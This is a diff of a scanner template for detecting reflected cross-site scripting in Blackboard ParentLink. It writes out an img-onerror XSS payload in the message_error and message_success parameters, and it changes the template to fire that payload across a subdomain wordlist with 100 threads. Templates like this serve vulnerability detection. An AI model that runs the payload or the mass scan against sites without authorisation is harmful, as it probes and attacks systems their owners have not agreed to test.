@@ -1,39 +1,41 @@
-id: parentlink-xss
-
+id: parentlink-xss 2
 info:
-  name: Blackboard - Cross-Site Scripting
   author: r3naissance
-  severity: high
-  description: Blackboard contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
-  reference:
-    - https://help.blackboard.com/Community_Engagement/Administrator/Release_Notes
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
-    cvss-score: 7.2
-    cwe-id: CWE-79
+  name: Blackboard ParentLink Reflected XSS
+  reference: https://help.blackboard.com/Community_Engagement/Administrator/Release_Notes
+  severity: medium
   tags: blackboard,parentlink,xss
-
 requests:
-  - method: GET
-    path:
-      - '{{BaseURL}}/main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E'
-      - '{{BaseURL}}/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E'
+- attack: sniper
+  matchers:
+  - part: body
+    type: word
+    words:
+    - <img src=c onerror=alert(8675309)>
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
+    HTTP/1.1
 
-    matchers-condition: and
-    matchers:
+    Host: {{Subdomains}}
 
-      - type: word
-        words:
-          - '<img src=c onerror=alert(8675309)>'
-        part: body
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
+    (KHTML, like Gecko)
 
-      - type: word
-        words:
-          - "text/html"
-        part: header
+    Accept-Encoding: gzip, deflate
 
-      - type: status
-        status:
-          - 200
+    Accept: */*
 
-# Enhanced by mp on 2022/09/23
+    Connection: close
+
+    '
+  threads: 100
